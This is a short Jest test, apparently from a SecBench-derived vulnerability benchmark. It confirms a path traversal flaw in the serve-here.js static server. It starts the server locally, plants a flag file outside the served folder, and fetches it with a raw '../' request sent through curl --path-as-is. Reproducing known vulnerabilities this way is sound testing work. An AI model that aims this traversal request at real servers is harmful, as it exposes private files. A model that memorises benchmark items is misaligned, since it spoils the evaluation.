// Path traversal in serve-here.js: a raw ../ request escapes the served folder.
// Server-based, like SecBench's original exploit (spawn the server, curl with
// --path-as-is). Passes when the response is a file outside the root folder.
const { spawn, execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

test("serve-here path traversal", (done) => {
  const flag = path.resolve(process.cwd(), "..", "flag-serve-here");
  fs.writeFileSync(flag, "SECRET-FLAG");
  const server = spawn("node", ["node_modules/serve-here.js/bin/index.js", "-p", "8111"],
                       { cwd: process.cwd(), stdio: "ignore" });
  setTimeout(() => {
    let body = "";
    try {
      body = execSync("curl -s --path-as-is 'http://127.0.0.1:8111/../flag-serve-here'").toString();
    } catch (e) {}
    server.kill("SIGKILL");
    try { fs.unlinkSync(flag); } catch (e) {}
    try { expect(body.includes("SECRET-FLAG")).toBe(true); } finally { done(); }
  }, 2500);
}, 20000);
